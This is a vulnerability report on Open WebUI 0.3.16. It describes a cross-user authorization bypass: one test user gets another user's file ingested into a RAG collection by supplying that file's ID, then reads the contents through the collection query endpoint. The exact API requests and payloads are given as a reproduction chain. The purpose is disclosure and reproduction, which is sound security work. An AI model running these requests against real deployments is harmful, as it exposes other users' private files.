# B4 — Cross-User RAG Ingestion and Content Disclosure

## Environment

- Target: Open WebUI 0.3.16
- Attacker: test1
- Victim/resource owner: test2
- Collection: `b4-marker`
- File: `marker_test2.txt`
- File ID: `6b29b39c-95e2-4bc9-918f-62be8dd7d886`

## 1. Victim File Ownership

Test2 uploaded `marker_test2.txt`.

The upload response established:

- Owner: test2
- File ID: `6b29b39c-95e2-4bc9-918f-62be8dd7d886`
- Filename: `..._marker_test2.txt`

The file contained the unique marker:

`TOPSECRET-TEST2-4821`

## 2. Normal File Access Denied

Test1 attempted to access the Test2-owned file:

`GET /api/v1/files/6b29b39c-95e2-4bc9-918f-62be8dd7d886`

Result:

`HTTP/1.1 404 Not Found`

This demonstrates that Test1 could not directly retrieve the Test2-owned file through the normal file endpoint.

## 3. Cross-User RAG Processing

Authenticated as Test1:

`POST /rag/api/v1/process/doc`

Request:

```json
{
  "file_id": "6b29b39c-95e2-4bc9-918f-62be8dd7d886",
  "collection_name": "b4-marker"
}

Response:

{
  "status": true,
  "collection_name": "b4-marker",
  "known_type": true,
  "filename": "marker_test2.txt"
}

#. Cross-User Content Retrieval

Authenticated as Test1:

POST /rag/api/v1/query/collection

Request:

{
  "collection_names": ["b4-marker"],
  "query": "What is the quarantine protocol code?",
  "k": 5
}

Response returned the Test2-owned document content:

{
  "file_id": "6b29b39c-95e2-4bc9-918f-62be8dd7d886",
  "name": "marker_test2.txt",
  "source": "/app/backend/data/uploads/6b29b39c-95e2-4bc9-918f-62be8dd7d886_marker_test2.txt",
  "start_index": 0
}

Reproduction Chain

Test2 owns file
→ Test1 cannot access file normally
→ Test1 submits Test2 file ID to /process/doc
→ server processes the file into b4-marker
→ Test1 queries b4-marker
→ Test1 receives Test2’s file content.

Conclusion

The RAG processing path does not enforce the same per-user file authorization boundary enforced by the normal file endpoint.
A Test1 user can cause a Test2-owned file to be ingested into a RAG collection and subsequently retrieve the file’s contents through the collection query endpoint.
